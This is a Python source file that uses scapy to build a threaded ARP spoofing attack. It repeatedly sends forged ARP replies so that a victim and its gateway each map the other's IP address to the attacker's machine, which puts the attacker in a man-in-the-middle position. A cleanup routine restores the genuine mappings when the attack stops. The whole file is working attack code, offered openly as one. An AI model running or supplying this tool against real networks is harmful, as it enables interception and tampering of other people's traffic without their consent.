import scapy.all as sp
import time
import threading
REPLAY = 2
BROADCAST = "ff:ff:ff:ff:ff:ff"

class arp_spoof_t(threading.Thread, ):
    TIMEOUT = 10
    def __init__(self, info):
        self.info = info
        self.stop = threading.Event() # used for closing thread and sub threads cleanly
        super(arp_spoof_t, self).__init__()
    def close(self,):
        """
        closes the attack
        """
        self.stop.clear()
        sp.send(sp.ARP(op=REPLAY, pdst=self.info.gIP, psrc=self.info.vIP, hwdst=BROADCAST,
                       hwsrc=self.info.arp_table[self.info.vIP],), count=7)
        sp.send(sp.ARP(op=REPLAY, pdst=self.info.vIP, psrc=self.info.gIP, hwdst=BROADCAST,
                       hwsrc=self.info.arp_table[self.info.gIP],), count=7)

    def run(self, ):
        self.stop.set()
        try:
            self.spoof()
        finally:
            self.close()


    def spoof(self,):
        """
        args : self: an Attack instance
        returns: None
        tells the target you are the gateway and the gateway that you are the target
        """
        while self.stop.wait(0):
            sp.send(sp.ARP(op=REPLAY, pdst=self.info.vIP, psrc=self.info.gIP, hwdst=self.info.arp_table[self.info.vIP]))
            sp.send(sp.ARP(op=REPLAY, pdst=self.info.gIP, psrc=self.info.vIP, hwdst=self.info.arp_table[self.info.gIP]))
            time.sleep(arp_spoof_t.TIMEOUT)#refresh the targets arp cache every timeout